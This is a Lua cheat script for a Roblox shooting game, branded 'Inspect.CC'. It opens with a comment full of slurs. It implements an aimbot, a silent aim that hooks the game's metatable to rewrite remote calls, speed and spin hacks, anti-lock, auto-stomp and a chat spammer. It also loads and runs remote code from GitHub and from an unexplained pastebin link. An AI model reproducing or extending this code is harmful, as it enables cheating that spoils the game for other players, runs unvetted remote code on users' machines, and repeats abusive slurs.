--[[Hi nigga I see You deobfuscate our shit Well You can leak it Idgaf Yes its skidded This is a Side project so i dont care if the source gets leak Kid XDDD Go get a life and stop deobfuscating shit But here you are reading it, before you Go hete and SAY YUNV2 SKIDDDDDDDD Just remember we Dont give flying fucks Nigga.]]
--Wroted By Paws.
--Imrpoved Silent aim, Improved Camlock, Renamed some shit,


repeat
    wait()
until game:IsLoaded() and game.Players.LocalPlayer.Character:FindFirstChild("FULLY_LOADED_CHAR")
local timetoload = tick()
local Players = game:GetService('Players')
local Client = Players.LocalPlayer
local CoreGui = game:GetService('CoreGui')
function getHealth(target)
    if (target) then
        return tonumber(Players[target].Character.Humanoid.Health)
    else
        return 0
    end
end
function getArmor(target)
    if (target) then
        return tonumber(Players[target].Character.BodyEffects.Armor.Value)
    else
        return 0
    end
end
function getDistance(target)
    if (target) then
        return tonumber((Client.Character.HumanoidRootPart.Position - target.Character.HumanoidRootPart.Position).magnitude)
    else
        return 100
    end
end
function isWinning(target)
    if (target) then
        -- // Health
        local clientHealth = math.floor(getHealth(tostring(Client.Name)))
        local tHealth = math.floor(getHealth(target))
        
        -- // If the target has more health than our client
        if (clientHealth < tHealth) then
            return true
        else
            return false
        end
    else
        return true
    end
end
local healthGUI = Instance.new("ScreenGui")
local Body = Instance.new("Frame")
local TopBar = Instance.new("Frame")
local topBarCorner = Instance.new("UICorner")
local targetHeadshot = Instance.new("ImageLabel")
local targetName = Instance.new("TextLabel")
local healthBar = Instance.new("Frame")
local healthBarCorner = Instance.new("UICorner")
local healthBarBG = Instance.new("Frame")
local healthBarBGCorner = Instance.new("UICorner")
local healthIcon = Instance.new("ImageLabel")
local healthText = Instance.new("TextLabel")
local bodyCorner = Instance.new("UICorner")
local armorBar = Instance.new("Frame")
local armorBarCorner = Instance.new("UICorner")
local armorBarBG = Instance.new("Frame")
local armorBGCorner = Instance.new("UICorner")
local armorText = Instance.new("TextLabel")
local armorIcon = Instance.new("ImageLabel")
local Distance = Instance.new("TextLabel")
local Winning = Instance.new("TextLabel")
function setTargetHUDColor(color)
    armorBarBG.BackgroundColor3 = Color3.fromRGB(color)
    TopBar.BackgroundColor3 = Color3.fromRGB(color)
    healthBarBG.BackgroundColor3 = Color3.fromRGB(color)
end
healthGUI.Name = "healthGUI"
healthGUI.Parent = CoreGui
Body.Name = "Body"
Body.Parent = healthGUI
Body.AnchorPoint = Vector2.new(0.5, 0.5)
Body.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Body.BorderSizePixel = 0
Body.ClipsDescendants = true
Body.Position = UDim2.new(0.5, 0, 0.798113227, 0)
Body.Size = UDim2.new(0, 240, 0, 131)
Body.Visible = false
TopBar.Name = "TopBar"
TopBar.Parent = Body
TopBar.AnchorPoint = Vector2.new(0.5, 0.5)
TopBar.BorderSizePixel = 0
TopBar.Position = UDim2.new(0.5, 0, 0.0199999996, 0)
TopBar.Size = UDim2.new(1, 5, 0, 6)
topBarCorner.CornerRadius = UDim.new(0, 5)
topBarCorner.Name = "topBarCorner"
topBarCorner.Parent = TopBar
targetHeadshot.Name = "targetHeadshot"
targetHeadshot.Parent = Body
targetHeadshot.AnchorPoint = Vector2.new(0.5, 0.5)
targetHeadshot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
targetHeadshot.BackgroundTransparency = 1
targetHeadshot.BorderSizePixel = 0
targetHeadshot.Position = UDim2.new(0.25, 0, 0.519999981, 0)
targetHeadshot.Size = UDim2.new(0, 100, 0, 100)
targetHeadshot.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
targetName.Name = "targetName"
targetName.Parent = Body
targetName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
targetName.BackgroundTransparency = 1.000
targetName.BorderSizePixel = 0
targetName.Position = UDim2.new(0.491666675, 0, 0.137404576, 0)
targetName.Size = UDim2.new(0, 113, 0, 12)
targetName.Font = Enum.Font.Roboto
targetName.Text = "1fzn"
targetName.TextColor3 = Color3.fromRGB(255, 255, 255)
targetName.TextSize = 14.000
targetName.TextXAlignment = Enum.TextXAlignment.Left
targetName.TextScaled = true
healthBar.Name = "healthBar"
healthBar.Parent = Body
healthBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
healthBar.BorderSizePixel = 0
healthBar.Position = UDim2.new(0.491666675, 0, 0.290076345, 0)
healthBar.Size = UDim2.new(0, 113, 0, 17)
healthBarCorner.CornerRadius = UDim.new(0, 2)
healthBarCorner.Name = "healthBarCorner"
healthBarCorner.Parent = healthBar
healthBarBG.Name = "healthBarBG"
healthBarBG.Parent = healthBar
healthBarBG.BorderSizePixel = 0
healthBarBG.Size = UDim2.new(1, 0, 0, 17)
healthBarBGCorner.CornerRadius = UDim.new(0, 3)
healthBarBGCorner.Name = "healthBarBGCorner"
healthBarBGCorner.Parent = healthBarBG
healthIcon.Name = "healthIcon"
healthIcon.Parent = healthBar
healthIcon.AnchorPoint = Vector2.new(0.5, 0.5)
healthIcon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
healthIcon.BackgroundTransparency = 1.000
healthIcon.BorderSizePixel = 0
healthIcon.Position = UDim2.new(0.0799999982, 0, 0.5, 0)
healthIcon.Size = UDim2.new(0, 12, 0, 13)
healthIcon.Image = "rbxassetid://3192484653"
healthText.Name = "healthText"
healthText.Parent = healthBar
healthText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
healthText.BackgroundTransparency = 1.000
healthText.BorderSizePixel = 0
healthText.Size = UDim2.new(0, 113, 0, 17)
healthText.Font = Enum.Font.Roboto
healthText.Text = "100"
healthText.TextColor3 = Color3.fromRGB(255, 255, 255)
healthText.TextSize = 14.000
bodyCorner.CornerRadius = UDim.new(0, 3)
bodyCorner.Name = "bodyCorner"
bodyCorner.Parent = Body
armorBar.Name = "armorBar"
armorBar.Parent = Body
armorBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
armorBar.BorderSizePixel = 0
armorBar.Position = UDim2.new(0.492000014, 0, 0.449999988, 0)
armorBar.Size = UDim2.new(0, 113, 0, 17)
armorBarCorner.CornerRadius = UDim.new(0, 2)
armorBarCorner.Name = "armorBarCorner"
armorBarCorner.Parent = armorBar
armorBarBG.Name = "armorBarBG"
armorBarBG.Parent = armorBar
armorBarBG.BorderSizePixel = 0
armorBarBG.Size = UDim2.new(0.513274312, 0, 0, 17)
armorBGCorner.CornerRadius = UDim.new(0, 3)
armorBGCorner.Name = "armorBGCorner"
armorBGCorner.Parent = armorBarBG
armorText.Name = "armorText"
armorText.Parent = armorBar
armorText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
armorText.BackgroundTransparency = 1.000
armorText.BorderSizePixel = 0
armorText.Size = UDim2.new(0, 113, 0, 17)
armorText.Font = Enum.Font.Roboto
armorText.Text = "50"
armorText.TextColor3 = Color3.fromRGB(255, 255, 255)
armorText.TextSize = 14.000
armorIcon.Name = "armorIcon"
armorIcon.Parent = armorBar
armorIcon.AnchorPoint = Vector2.new(0.5, 0.5)
armorIcon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
armorIcon.BackgroundTransparency = 1.000
armorIcon.BorderSizePixel = 0
armorIcon.Position = UDim2.new(0.0799999982, 0, 0.5, 0)
armorIcon.Size = UDim2.new(0, 12, 0, 13)
armorIcon.Image = "rbxassetid://7169354142"
Distance.Name = "Distance"
Distance.Parent = Body
Distance.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Distance.BackgroundTransparency = 1.000
Distance.BorderSizePixel = 0
Distance.Position = UDim2.new(0.491666675, 0, 0.78, 0)
Distance.Size = UDim2.new(0, 110, 0, 17)
Distance.Font = Enum.Font.Roboto
Distance.Text = "Distance: 98 studs"
Distance.TextColor3 = Color3.fromRGB(255, 255, 255)
Distance.TextSize = 13.000
Distance.TextXAlignment = Enum.TextXAlignment.Left
Winning.Name = "Winning"
Winning.Parent = Body
Winning.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Winning.BackgroundTransparency = 1.000
Winning.BorderSizePixel = 0
Winning.Position = UDim2.new(0.491666675, 0, 0.620000005, 0)
Winning.Size = UDim2.new(0, 110, 0, 17)
Winning.Font = Enum.Font.Roboto
Winning.Text = "Winning: true"
Winning.TextColor3 = Color3.fromRGB(255, 255, 255)
Winning.TextSize = 13.000
Winning.TextXAlignment = Enum.TextXAlignment.Left
_G.ArmorBAR = Color3.fromRGB(255, 0, 4)
 _G.TOPBAR =Color3.fromRGB(255, 0, 4)
_G.healthBarBG = Color3.fromRGB(255, 0, 4)
armorBarBG.BackgroundColor3 = _G.ArmorBAR
TopBar.BackgroundColor3 = _G.TOPBAR
healthBarBG.BackgroundColor3 = _G.healthBarBG
local CC = game:GetService("Workspace").CurrentCamera
local LocalMouse = game.Players.LocalPlayer:GetMouse()
local Locked = false
local cc = game:GetService("Workspace").CurrentCamera
local gs = game:GetService("GuiService")
local Players, Client, Mouse, Camera =
    game:GetService("Players"),
    game:GetService("Players").LocalPlayer,
    game:GetService("Players").LocalPlayer:GetMouse(),
    game:GetService("Workspace").CurrentCamera
local ggi = gs.GetGuiInset
local lp = game:GetService("Players").LocalPlayer
local mouse = lp:GetMouse()
local Storage = {
    Idle = game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId,
    Run = game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId,
    Walk = game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId,
    Face = nil,
    RightFootMeshID = game.Players.LocalPlayer.Character.RightFoot.MeshId,
    RightLowerLegMeshID = game.Players.LocalPlayer.Character.RightLowerLeg.MeshId,
    RightUpperLegMeshID = game.Players.LocalPlayer.Character.RightUpperLeg.MeshId,
    RightFootTransparency = game.Players.LocalPlayer.Character.RightUpperLeg.TextureID,
    RightLowerLegTransparency = game.Players.LocalPlayer.Character.RightLowerLeg.Transparency
}
pcall(
    function()
        if (game.Players.LocalPlayer.Character.Head.face.Texture ~= nil) then
            Storage.Face = game.Players.LocalPlayer.Character.Head.face.Texture
        end
    end
)
local Script = {
    Name = "Inspect.CC"
}
local Misc = {
  
    Speed = false,
    Value = 0.6,
    NewSpeed = false,
    NewSpeedValue = 110,
    SpinAngle2 = -250,
    Spinbot = false,
    Jitter = false,
    JitterAngle = math.random(30, 90),
    SpinAngle = 60,
    Spin = false,
    AutoEat = false,
    SpinVelocity = -250,
    SpinAngle = 555,
    Slingshot = false,
    SlingshotValue = 0.999,
    AntiStomp = false,
    AutoReload = false,
    AutoStomp = false,
    TrashTalk = false,
    AntiLock = false,
    AntilockSpeed = 0.260319,
    AntiBag = false,
    Confusion = false,
    AutoPickCash = false,
    AutoDropCash = false,
    RemoveJumpCooldown = false,
    FakeLag = false,
    BunnyHop = false
}
getgenv().Aimbot = {
    Enabled = false,
    Notification = false,
    Keybind = Enum.KeyCode.Q,
    Hitbox = "HumanoidRootPart",
    HitAirshots = false,
    AirshotPart = "RightFoot",
    Resolver = false,
    Backup = "HumanoidRootPart",
    PredictionEnabled = false,
    Prediction = 1.13684,
    AutoSetup = false,
    Smoothing = true,
    Smoothness = 0.015,
    Radius = 120
}
getgenv().Silent = {
    Enabled = false,
    Key = Enum.KeyCode.Q,
    Prediction = 1.132,
    Airshot = false,
    AirshotPart = "RightFoot",
    Backup = "HumanoidRootPart",
    Notification = true,
    WallCheck = true,
    Part = "LowerTorso",
    RandomPart = false,
    AutoSetup = false,
    AutoTarget = false,
    LookAt = true,
    Radius = 120,
    TargetStats = false,
    RainbowTargetStats = false
}
getgenv().Tracer = false
local TimeTick
TimeTick =
    hookfunction(
    wait,
    function(JumpCooldown)
        if JumpCooldown == 1.5 and Misc.RemoveJumpCooldown or Misc.BunnyHop then
            return TimeTick()
        end
        return TimeTick(JumpCooldown)
    end
)
local Locking = false
game:GetService("UserInputService").InputBegan:Connect(
    function(Key, Typing)
        if (not Typing) then
            if (Key.KeyCode == Aimbot.Keybind) then
                if Aimbot.Enabled then
                    Locking = not Locking
                    if Locking then
                        AimbotVictim = AimbotGetClosest()
                        if Aimbot.Notification then
                            x(AimbotVictim.Character.Humanoid.DisplayName, 3,'rbxthumb://type=AvatarHeadShot&id=' .. AimbotVictim.UserId .. '&w=420&h=420')
                        elseif not Locking then
                            if AimbotVictim then
                                AimbotVictim = nil
                                if Aimbot.Notification then
                                    x("Unlocked",nil)
                                end
                            end
                        end
                    end
                end
            end
        end
    end
)
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Blissful4992/ESPs/main/3D%20Drawing%20Api.lua"))()
local Circle = Library:New3DCircle()
Circle.Visible = true
Circle.ZIndex = 1
Circle.Transparency = 1
Circle.Color = Color3.fromRGB(0,0,0)
Circle.Thickness = 0.5
Circle.Radius = 6
local delta = 0
local duration = 0.5
local target_strafe = false
game:GetService("RunService").Stepped:Connect(
    function(a, b)
        if Plr ~= nil and target_strafe then
            delta = (delta + b/duration) % 1
            Circle.Visible = true
            Circle.Position = Plr.Character.HumanoidRootPart.Position
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.Angles(0, 2 * math.pi * delta, 0)* CFrame.new(0, 0, Circle.Radius)+ Plr.Character.HumanoidRootPart.Position
        else
            Circle.Visible = false
        end
         armorBarBG.BackgroundColor3 = _G.ArmorBAR
TopBar.BackgroundColor3 = _G.TOPBAR
healthBarBG.BackgroundColor3 =_G.healthBarBG
        if Silent.RainbowTargetStats then
        armorBarBG.BackgroundColor3 = Color3.fromHSV(tick() % 5 / 5, 1, 1)
TopBar.BackgroundColor3 = Color3.fromHSV(tick() % 5 / 5, 1, 1)
healthBarBG.BackgroundColor3 = Color3.fromHSV(tick() % 5 / 5, 1, 1)
end
        if AimbotVictim ~= nil and Aimbot.Enabled and Aimbot.Smoothing then
            local Main =
                CFrame.new(
                workspace.CurrentCamera.CFrame.p,
                AimbotVictim.Character[Aimbot.Hitbox].Position +
                    AimbotVictim.Character[Aimbot.Hitbox].Velocity * Aimbot.Prediction / 10
            )
            workspace.CurrentCamera.CFrame =
                workspace.CurrentCamera.CFrame:Lerp(
                Main,
                Aimbot.Smoothness,
                Enum.EasingStyle.Elastic,
                Enum.EasingDirection.InOut
            )
        end
        if Locking and AimbotVictim ~= nil and Aimbot.Enabled and not Aimbot.Smoothing then
            workspace.CurrentCamera.CFrame =
                CFrame.new(
                workspace.CurrentCamera.CFrame.Position,
                AimbotVictim.Character[Aimbot.Hitbox].Position +
                    AimbotVictim.Character[Aimbot.Hitbox].Velocity * Aimbot.Prediction / 10
            )
        end
        if Locking and Aimbot.Enabled and not Aimbot.Smoothing and not Aimbot.PredictionEnabled then
            workspace.CurrentCamera.CFrame =
                CFrame.new(workspace.CurrentCamera.CFrame.Position, AimbotVictim.Character[Aimbot.Hitbox].Position)
        end
        if Aimbot.HitAirshots == true then
            if AimbotVictim.Character.Humanoid.FloorMaterial == Enum.Material.Air then
                Aimbot.Hitbox = Aimbot.AirshotPart
            else
                Aimbot.Hitbox = Aimbot.Backup
            end
        end
        if Misc.BunnyHop then
                    if game.Players.LocalPlayer.Character.Humanoid.FloorMaterial == Enum.Material.Air then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.Humanoid.MoveDirection * 0.17
            end
        end
    end
)
loadstring(game:HttpGet("https://pastebin.com/raw/chaGRRFm"))()

local Tracer = Drawing.new("Line")
Tracer.Visible = false
Tracer.Color = Color3.fromRGB(0, 166, 88)
Tracer.Thickness = 1
Tracer.Transparency = 1
_G.TracerVisible = false
_G.TracerColor = Color3.fromRGB(255, 170, 0)
_G.TracerThickness = 2
_G.TracerTransparency = 1

function x(tx,ic)
    game.StarterGui:SetCore(
        "SendNotification",
        {
            Title = Script.Name,
            Text = tx,
            Duration = 3.6,
            Icon = ic
        }
    )
end
function GetGun()
    if game.Players.LocalPlayer.Character then
        for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if v:FindFirstChild "Ammo" then
                return v
            end
        end
    end
    return nil
end
BulletTracers = true
local Services = {
    Players = game:GetService("Players"),
    UserInputService = game:GetService("UserInputService"),
    RunService = game:GetService("RunService")
}

local Local = {
    Player = Services.Players.LocalPlayer,
    Mouse = Services.Players.LocalPlayer:GetMouse()
}
local Other = {
    Camera = workspace.CurrentCamera,
    BeamPart = Instance.new("Part", workspace)
}

Other.BeamPart.Name = "BeamPart"
Other.BeamPart.Transparency = 1
local Settings = {
    StartColor = MainAccentColor,
    EndColor = MainAccentColor,
    StartWidth = 3,
    EndWidth = 3,
    ShowImpactPoint = false,
    ImpactTransparency = 0.5,
    ImpactColor = Color3.new(1, 1, 1),
    Time = 1
}
local funcs = {}
Local.Mouse.TargetFilter = Other.BeamPart
function funcs:Beam(v1, v2)
    v2 = Vector3.new(v2.X - 0.1, v2.Y + 0.2, v2.Z)
    local colorSequence =
        ColorSequence.new(
        {
            ColorSequenceKeypoint.new(0, bullet_tracer_color),
            ColorSequenceKeypoint.new(1, bullet_tracer_color)
        }
    )
    local Part = Instance.new("Part", Other.BeamPart)
    Part.Size = Vector3.new(0, 0, 0)
    Part.Massless = true
    Part.Transparency = 1
    Part.CanCollide = false
    Part.Position = v1
    Part.Anchored = true
    local Attachment = Instance.new("Attachment", Part)
    local Part2 = Instance.new("Part", Other.BeamPart)
    Part2.Size = Vector3.new(0, 0, 0)
    Part2.Transparency = 0
    Part2.CanCollide = false
    Part2.Position = v2
    Part2.Anchored = true
    Part2.Material = Enum.Material.ForceField
    Part2.Color = Settings.ImpactColor
    Part2.Massless = true
    local Attachment2 = Instance.new("Attachment", Part2)
    local Beam = Instance.new("Beam", Part)
    Beam.FaceCamera = true
    Beam.Color = colorSequence
    Beam.Attachment0 = Attachment
    Beam.Attachment1 = Attachment2
    Beam.LightEmission = 6
    Beam.LightInfluence = 1
    Beam.Width0 = Settings.StartWidth
    Beam.Width1 = Settings.EndWidth
    Beam.Texture = "http://www.roblox.com/asset/?id=9150663556"
    Beam.TextureSpeed = 2
    Beam.TextureLength = 1
    delay(
        Settings.Time,
        function()
            Part:Destroy()
            Part2:Destroy()
        end
    )
end
spawn(
    function()
        while task.wait(0.5) do
            gun = GetGun()
            if gun then
                LastAmmo = gun.Ammo.Value
                gun.Ammo:GetPropertyChangedSignal("Value"):Connect(
                    function()
                        if BulletTracers and gun.Ammo.Value < LastAmmo then
                            LastAmmo = gun.Ammo.Value
                            if getgenv().Silent.Enabled and Plr ~= nil then
                                if getgenv().Silent.PredictionEnabled then
                                    funcs:Beam(gun.Handle.Position, Plr.Character[getgenv().Silent.Part].Position + (Plr.Character[getgenv().Silent.Part].Velocity * Silent.Prediction / 10))
                                        else
                                    funcs:Beam(gun.Handle.Position, Plr.Character[getgenv().Silent.Part].Position)
                                end
                            else
                                funcs:Beam(gun.Handle.Position, Local.Mouse.hit.p)
                            end
                        end
                    end
                )
            end
        end
    end
)
game:GetService("UserInputService").InputBegan:Connect(
    function(keygo, ok)
        if (not ok) then
            if (keygo.KeyCode == getgenv().Silent.Key) then
                if getgenv().Silent.Enabled then
                    Locked = not Locked
                    if Locked then
                        Plr = SilentGetClosest()
                        if Silent.Notification then
                            pcall(
                                function()
                                    x(Plr.Character.Humanoid.DisplayName,'rbxthumb://type=AvatarHeadShot&id=' .. Plr.UserId .. '&w=420&h=420')
                                end
                            )
                        end
                    elseif not Locked then
                        if Plr then
                            Plr = nil
                            if Silent.Notification then
                                x("Unlocked!",nil)
                            end
                        end
                    end
                end
            end
        end
    end
)

function AimbotWallCheck(destination, ignore)
    if (getgenv().Aimbot.WallCheck) then
        local Origin = Camera.CFrame.p
        local CheckRay = Ray.new(Origin, destination - Origin)
        local Hit = game:GetService("Workspace"):FindPartOnRayWithIgnoreList(CheckRay, ignore)
        return Hit == nil
    else
        return true
    end
end

function AimbotGetClosest()
    local closestPlayer
    local shortestDistance = getgenv().Aimbot.Radius

    for _, plr in next, Players:GetPlayers() do
        if (plr ~= Client) then
            local Character = plr.Character
            local notKO = Character:WaitForChild("BodyEffects")["K.O"].Value ~= true
            local notGrabbed = Character:FindFirstChild("GRABBING_COINSTRAINT") == nil
            if (Character and Character ~= Client and Character.Humanoid.Health > 1 and notKO and notGrabbed) then
                local ScreenPosition, IsVisibleOnViewPort =
                    Camera:WorldToViewportPoint(Character.HumanoidRootPart.Position)
                if (IsVisibleOnViewPort and AimbotWallCheck(Character.HumanoidRootPart.Position, {Client, Character})) then
                    local MDistance =
                        (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(ScreenPosition.X, ScreenPosition.Y)).Magnitude
                    if (MDistance < shortestDistance) then
                        closestPlayer = plr
                        shortestDistance = MDistance
                    end
                end
            end
        end
    end
    if (closestPlayer ~= nil) then
        return closestPlayer
    else
        return nil
    end
end

function SilentWallCheck(destination, ignore)
    if (getgenv().Silent.WallCheck) then
        local Origin = Camera.CFrame.p
        local CheckRay = Ray.new(Origin, destination - Origin)
        local Hit = game:GetService("Workspace"):FindPartOnRayWithIgnoreList(CheckRay, ignore)
        return Hit == nil
    else
        return true
    end
end

function SilentGetClosest()
    local closestPlayer
    local shortestDistance = getgenv().Silent.Radius

    for _, plr in next, Players:GetPlayers() do
        if (plr ~= Client) then
            local Character = plr.Character
            local notKO = Character:WaitForChild("BodyEffects")["K.O"].Value ~= true
            local notGrabbed = Character:FindFirstChild("GRABBING_COINSTRAINT") == nil
            if (Character and Character ~= Client and Character.Humanoid.Health > 1 and notKO and notGrabbed) then
                local ScreenPosition, IsVisibleOnViewPort =
                    Camera:WorldToViewportPoint(Character.HumanoidRootPart.Position)
                if (IsVisibleOnViewPort and SilentWallCheck(Character.HumanoidRootPart.Position, {Client, Character})) then
                    local MDistance =
                        (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(ScreenPosition.X, ScreenPosition.Y)).Magnitude
                    if (MDistance < shortestDistance) then
                        closestPlayer = plr
                        shortestDistance = MDistance
                    end
                end
            end
        end
    end
    if (closestPlayer ~= nil) then
        return closestPlayer
    else
        return nil
    end
end

local rawmetatable = getrawmetatable(game)
local old = rawmetatable.__namecall
setreadonly(rawmetatable, false)
rawmetatable.__namecall =
    newcclosure(
    function(...)
        local args = {...}
        if
            Plr ~= nil and getgenv().Silent.Enabled and getnamecallmethod() == "FireServer" and
                args[2] == "UpdateMousePos"
         then
            if getgenv().Silent.PredictionEnabled then
                args[3] =
                    Plr.Character[getgenv().Silent.Part].Position +
                    (Plr.Character[getgenv().Silent.Part].Velocity * Silent.Prediction / 10)
            else
                args[3] = Plr.Character[getgenv().Silent.Part].Position
            end
            return old(unpack(args))
        end
        return old(...)
    end
)

game:GetService("RunService").Stepped:connect(
    function()
        if getgenv().Mousemoverel.Enabled and MouseVictim ~= nil then
            pcall(
                function()
                    local goal =
                        CC:WorldToScreenPoint(
                        MouseVictim.Character[getgenv().Mousemoverel.Part].Position +
                            (MouseVictim.Character[getgenv().Mousemoverel.Part].Velocity *
                                getgenv().Mousemoverel.Prediction /
                                10)
                    )
                    mousemoverel(goal.X - LocalMouse.X, goal.Y - LocalMouse.Y)
                end
            )
        end

        if getgenv().Mousemoverel.Airshot then
            if MouseVictim.Character.Humanoid.FloorMaterial == Enum.Material.Air then
                getgenv().Partz = "RightFoot"
            else
                getgenv().Partz = "LowerTorso"
            end
        end
        if Misc.Speed then
            if Misc.AntiLock == false then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame +
                    game.Players.LocalPlayer.Character.Humanoid.MoveDirection * Misc.Value
            end
        end

        if Misc.NewSpeed then
            if game.Players.LocalPlayer.Character.Humanoid.FloorMaterial ~= Enum.Material.Air then
                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity =
                    game.Players.LocalPlayer.Character.Humanoid.MoveDirection * Misc.NewSpeedValue
            end
        end
        if Misc.Spinbot then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame *
                CFrame.Angles(0, math.rad(Misc.SpinAngle), 0)
        end
        if Misc.Jitter then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Position) *
                CFrame.Angles(
                    0,
                    math.rad(Misc.SpinAngle) +
                        math.rad((math.random(1, 2) == 1 and Misc.JitterAngle or -Misc.JitterAngle)),
                    0
                )
        end
        if Misc.Spin then
            game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity =
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * Misc.SpinVelocity
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame *
                CFrame.Angles(0, math.rad(Misc.SpinAngle2), 0)
        end
        if Misc.Slingshot then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, Misc.SlingshotValue, 0)
            wait(0.2)
        end
        if Misc.AntiStomp then
            if game.Players.LocalPlayer.Character:WaitForChild("BodyEffects")["K.O"].Value == true or game.Players.LocalPlayer.Character:FindFirstChild("GRABBING_CONSTRAINT")  then
                for i, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                    if v:IsA("BasePart") then
                        v:Destroy()
                    end
                end
            end
        end

        if Misc.AutoReload then
            pcall(
                function()
                    if
                        game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool"):FindFirstChild(
                            "Ammo"
                        ).Value == 0
                     then
                        game:GetService("ReplicatedStorage").MainEvent:FireServer(
                            "Reload",
                            game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool")
                        )
                    end
                end
            )
        end
        if Misc.AutoStomp then
            game.ReplicatedStorage.MainEvent:FireServer("Stomp")
        end
        if Misc.TrashTalk then
            wait(0.6)
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                "GET INSPECT.CC KID!",
                "All"
            )
            wait(5)
        end
        if Misc.AntiBag then
            pcall(function()
            game.Players.LocalPlayer.Character["Christmas_Sock"]:Destroy()
            end)
    end
        if Misc.AntiLock then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame +
                -game.Players.LocalPlayer.Character.Humanoid.MoveDirection * Misc.AntilockSpeed
        end

        if Misc.Confusion then
            game.Players.LocalPlayer.Character.Head.CanCollide = false
            game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
            game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
            game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame *
                CFrame.new(math.random(1, 2) == 1 and 2 or -2, 0, 0)
        else
            game.Players.LocalPlayer.Character.Head.CanCollide = true
            game.Players.LocalPlayer.Character.UpperTorso.CanCollide = true
            game.Players.LocalPlayer.Character.LowerTorso.CanCollide = true
            game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = true
        end
        if Misc.AutoPickCash then
            pcall(
                function()
                    for _, v in pairs(Workspace.Ignored.Drop:GetChildren()) do
                        if v.Name == "MoneyDrop" then
                            local MoneyMagnitude =
                                (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude
                            if MoneyMagnitude < 25 then
                                fireclickdetector(v.ClickDetector)
                            end
                        end
                    end
                end
            )
        end
        if Misc.AutoDropCash then
            game.ReplicatedStorage.MainEvent:FireServer("DropMoney", 10000)
        end
        if Misc.RandomiseToolPos then
            wait()
            pcall(
                function()
                    game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").GripPos =
                        Vector3.new(math.random(1, 2) == 1 and 2 or -2, 0, 0)
                end
            )
            wait()
        end

----LOLOLOLOL
        if getgenv().Silent.RandomPart then
            wait(0.001)
            getgenv().Silent.Part = "Head"
            wait(0.001)
            getgenv().Silent.Part = "HumanoidRootPart"
            wait(0.001)
            getgenv().Silent.Part = "UpperTorso"
            wait(0.001)
            getgenv().Silent.Part = "LowerTorso"
            wait(0.001)
            getgenv().Silent.Part = "LeftUpperLeg"
            wait(0.001)
            getgenv().Silent.Part = "LeftFoot"
            wait(0.001)
            getgenv().Silent.Part = "RightLowerArm"
            wait(0.001)
            getgenv().Silent.Part = "UpperTorso"
            wait(0.001)
            getgenv().Silent.Part = "LeftHand"
            wait(0.001)
        end
        
        if Misc.AutoEat then
            if game.Players.LocalPlayer.Character.Humanoid.Health < 45 then
                local Current_Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position

                if
                    game.Players.LocalPlayer.Character:FindFirstChild("[Chicken]") == nil or
                        game.Players.LocalPlayer.Backpack:FindFirstChild("[Chicken]") == nil
                 then
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                        game.Workspace.Ignored.Shop["[Chicken] - $7"].Head.CFrame
                    wait(0.5)
                    fireclickdetector(game.Workspace.Ignored.Shop["[Chicken] - $7"].ClickDetector)
                end
                pcall(
                    function()
                        game.Players.LocalPlayer.Character.Humanoid:EquipTool(
                            game.Players.LocalPlayer.Backpack["[Chicken]"]
                        )
                    end
                )
                pcall(
                    function()
                        game.Players.LocalPlayer.Character["[Chicken]"]:Activate()
                        wait(0.1)
                        game.Players.LocalPlayer.Character["[Chicken]"]:Deactivate()
                        wait(0.1)
                        game.Players.LocalPlayer.Character["[Chicken]"]:Activate()
                        wait(0.1)
                        game.Players.LocalPlayer.Character["[Chicken]"]:Deactivate()
                        wait(0.1)
                        game.Players.LocalPlayer.Character["[Chicken]"]:Activate()
